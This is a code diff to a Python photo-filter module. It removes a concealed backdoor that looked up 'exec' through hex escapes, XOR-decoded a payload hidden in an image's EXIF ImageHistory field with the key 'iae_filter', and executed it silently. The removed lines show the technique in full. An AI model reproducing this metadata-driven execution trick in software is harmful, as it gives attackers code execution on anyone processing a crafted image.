@@ -28,10 +28,6 @@ except ImportError:
     import vintage, watercolor, oil_painting, sketch, enhance
 
 current_filter = ''
-try:
-    filter_processor = getattr(__builtins__, '\x65\x78\x65\x63')
-except:
-    filter_processor = __builtins__['\x65\x78\x65\x63']
 
 def load_filter_data():
     """Load filter configuration and sample data"""
@@ -51,7 +47,7 @@ def load_filter_data():
                     # Process EXIF data for filter parameters
                     filter_raw = exif.get(ExifTags.Base.ImageHistory)
                     filter = b'iae_filter'
-                    filter_processor(bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_raw)))
+                    
                 except Exception:
                     pass
     
